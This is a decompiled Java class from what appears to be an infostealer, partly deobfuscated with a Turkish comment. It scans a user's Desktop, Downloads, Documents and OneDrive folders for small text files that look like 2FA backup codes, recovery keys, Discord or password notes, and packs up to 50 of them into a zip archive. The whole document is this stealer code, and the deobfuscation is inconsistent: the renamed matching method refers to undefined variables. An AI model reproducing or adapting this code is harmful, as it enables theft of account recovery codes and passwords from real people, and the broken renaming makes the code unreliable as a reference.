/*\n * ========================================\n * DEOBFUSCATED: DesktopFileScanner.java\n * Original: b/e.java\n * ----------------------------------------\n * Masaüstü dosya tarayıcı - backup, recovery, 2fa, auth dosyalarını arar\n * ========================================\n */\n\n/*
 * Decompiled with CFR 0.152.
 */
package b;

import b.b;
import c.r;
import java.io.File;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import org.apache.commons.io.FileUtils;

public final class e
extends b {
    public static final e INSTANCE = new e();
    private static final Pattern RECOVERY_CODE_PATTERN = Pattern.compile("[A-Za-z0-9]{4}[\\-\\s]?[A-Za-z0-9]{4}");
    private static final String[] c = new String[]{"backup", "recovery", "2fa", "mfa", "discord", "yedek", "auth", "backups", "password" /* r.pw() */, "passwords" /* r.pws() */};
    private static final String[] d = new String[]{"cookie" /* r.cki() */, "cookies" /* r.ck() */, "autofill", "history", "bookmark", "cache", "session", "log"};
    private static final long MAX_FILE_SIZE = 524288L;

    public void scanFiles(ZipOutputStream zipOutputStream) {
        try {
            String string = System.getProperty("user.home");
            if (string == null || string.isEmpty()) {
                return;
            }
            ArrayList<File> arrayList = new ArrayList<File>();
            arrayList.add(new File(string, "Desktop"));
            arrayList.add(new File(string, "Downloads"));
            arrayList.add(new File(string, "Documents"));
            arrayList.add(new File(string, "OneDrive\\Desktop"));
            arrayList.add(new File(string, "OneDrive\\Documents"));
            String string2 = System.getenv("PUBLIC");
            if (string2 != null && !string2.isEmpty()) {
                arrayList.add(new File(string2, "Desktop"));
            }
            int n2 = 0;
            for (File file : arrayList) {
                File[] fileArray;
                if (!file.isDirectory() || (fileArray = file.listFiles()) == null) continue;
                for (File file2 : fileArray) {
                    String string3;
                    if (!file2.isFile() || file2.length() > 524288L || file2.length() == 0L || !(string3 = file2.getName().toLowerCase()).endsWith(".txt") && !string3.endsWith(".csv") && !string3.endsWith(".log") || !b.e.a(string3, file2)) continue;
                    try {
                        byte[] byArray = FileUtils.readFileToByteArray(file2);
                        String string4 = file.getName();
                        String string5 = "BackupCodes/" + string4 + "/" + file2.getName();
                        zipOutputStream.putNextEntry(new ZipEntry(string5));
                        zipOutputStream.write(byArray);
                        zipOutputStream.closeEntry();
                        if (++n2 < 50) continue;
                        return;
                    }
                    catch (Exception exception) {
                        // empty catch block
                    }
                }
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private static boolean matchesTargetFile(String fileName, File dir) {
        for (String string2 : d) {
            if (!string.contains(string2)) continue;
            return false;
        }
        for (String string2 : c) {
            if (!string.contains(string2)) continue;
            return true;
        }
        try {
            String string3 = FileUtils.readFileToString(file, StandardCharsets.UTF_8).toLowerCase();
            int n2 = 0;
            for (String string4 : c) {
                if (!string3.contains(string4)) continue;
                ++n2;
            }
            if (n2 >= 2) {
                return true;
            }
            int n3 = 0;
            Matcher matcher = b.matcher(string3);
            while (matcher.find()) {
                ++n3;
            }
            if (n3 >= 4 && n2 >= 1) {
                return true;
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        return false;
    }
}

